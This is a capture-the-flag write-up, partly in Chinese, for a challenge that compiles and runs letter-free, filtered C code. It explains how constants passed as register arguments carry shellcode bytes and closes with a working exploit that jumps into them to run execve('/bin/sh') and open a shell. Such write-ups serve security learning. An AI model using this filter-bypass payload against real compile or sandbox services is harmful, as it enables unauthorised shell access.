# safe_c_compiler

challenge.py

```python
#!/usr/local/bin/python3 -u
import os
import subprocess
import tempfile
import re

print("Please Input your code")
code = input("> ")

if re.search(r'[A-Za-z]', code):
    print("error1")
    exit(1)

invalid_tokens = [
    "#","*","[","]","/","="
]
for token in invalid_tokens:
    if token in code:
        print("error2")
        print(token)
        exit(1)

if "_() {" not in code:
    print("error3")
    exit(1)

if code.count('{') > 1 or code.count('}') > 1:
    print("error4")
    exit(1)

with tempfile.TemporaryDirectory() as td:
    src_path = os.path.join(td, "source.c")
    compiled_path = os.path.join(td, "compiled")
    with open(src_path, "w") as file:
        file.write(code)

    returncode = subprocess.call(["gcc", "-B/usr/bin", "-Wl,--entry=_" ,"-nostartfiles", "-w", "-O0", "-o", compiled_path, src_path], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    if returncode != 0:
        print("compilation error")
        exit(1)
    print("success")
    subprocess.call([compiled_path])
```

需要编写一个符合题目约束情况下，可以getshell的程序
x86 64架构linux下的函数调用约定前六个参数使用寄存器传参，分别是rdi rsi rdx rcx r8 r9，在函数调用前会将参数依次传入寄存器，所使用的指令是 mov regxxx,data

![图片](./pic1.png)

观察可以发现，可以利用这一现象去写opcode，然后找一个劫持控制流的方式错位字节跳过去就能getshell
但是`mov reg64,data`，最多只有八个字节的位置可以写opcode，但可以通过相对偏移跳转去连接这些错位字节的opcode
取地址符号并没有被禁用，可以通过`&_`拿到主函数的函数指针，加一个偏移量去call就可以劫持控制流

exp:

```bash
_() {
   (&_ + 41)(1852400175,0,0,6845231); // (/bin,0,0,/sh)
   _(19701566652744); // shl rcx,32; jmp $+19
   _(81265623368); // add rdi,rcx; jmp $+20
   _(81258304599); // push rdi; push rsp; pop rdi; jmp $+20
   _(5561986562150); // mov ax,0x3b; syscall
}
```
